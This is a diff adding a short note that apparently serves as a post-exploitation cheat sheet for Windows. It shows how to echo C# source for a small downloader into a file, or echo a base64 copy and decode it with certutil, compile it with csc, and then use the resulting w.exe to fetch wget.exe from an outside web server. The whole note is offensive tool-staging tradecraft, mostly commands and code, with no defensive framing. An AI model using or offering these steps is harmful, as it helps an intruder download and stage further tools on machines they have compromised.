@@ -1,0 +1,55 @@
+SEE BELOW FOR EASIER WAY using BASE64 :-)
+
+echo using System; >>wget.cs
+echo using System.Net; >>wget.cs
+echo class WGet >>wget.cs
+echo { >>wget.cs
+echo static void Main(string[] args) >>wget.cs
+echo { >>wget.cs
+echo if (args.Length == 1) >>wget.cs
+echo { >>wget.cs
+echo string filename = null; >>wget.cs
+echo Uri _uri = new Uri(args[0]); >>wget.cs
+echo filename = _uri.Segments[_uri.Segments.Length - 1]; >>wget.cs
+echo Console.WriteLine(filename); >>wget.cs
+echo WebClient webClient = new WebClient(); >>wget.cs
+echo webClient.DownloadFile(args[0], filename); >>wget.cs
+echo } >>wget.cs
+echo if (args.Length == 0) >>wget.cs
+echo { >>wget.cs
+echo Console.WriteLine("feed it a URL"); >>wget.cs
+echo } >>wget.cs
+echo } >>wget.cs
+echo } >>wget.cs
+
+Once echoed to file:
+
+Then: `set path=%path%;C:\Windows\Microsoft.NET\Framework\v2.0.50727` (the location of net framework if not in path already)
+
+then `csc /out:w.exe wget.cs`
+
+that will leave you with w.exe
+
+then able to get the real wget on the machine by doing `w.exe http://<webserver>/wget.exe`
+
+
+
+################
+ In writeable directory:
+ 
+ echo dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uTmV0OwoKCmNsYXNzI
+FdHZXQKewogICAgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQogICAgewogICAgICAgIGlmI
+ChhcmdzLkxlbmd0aCA9PSAxKQogICAgICAgIHsKICAgICAgICAgICAgc3RyaW5nIGZpbGVuYW1lID0gb
+nVsbDsKICAgICAgICAgICAgVXJpIF91cmkgPSBuZXcgVXJpKGFyZ3NbMF0pOwogICAgICAgICAgICBma
+WxlbmFtZSA9IF91cmkuU2VnbWVudHNbX3VyaS5TZWdtZW50cy5MZW5ndGggLSAxXTsKICAgICAgICAgI
+CAgQ29uc29sZS5Xcml0ZUxpbmUoZmlsZW5hbWUpOwogICAgICAgICAgICBXZWJDbGllbnQgd2ViQ2xpZ
+W50ID0gbmV3IFdlYkNsaWVudCgpOwogICAgICAgICAgICB3ZWJDbGllbnQuRG93bmxvYWRGaWxlKGFyZ
+3NbMF0sIGZpbGVuYW1lKTsKCiAgICAgICAgfQogICAgICAgIGlmIChhcmdzLkxlbmd0aCA9PSAwKQogI
+CAgICAgIHsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoImZlZWQgaXQgYSBVUkwiKTsKICAgI
+CAgICB9CiAgICB9Cn0K>w.cs.b64
+
+certutil -decode w.cs.b64 w.cs
+
+*Connect the net framework to path if necessary*
+
+csc /out:w.exe w.cs
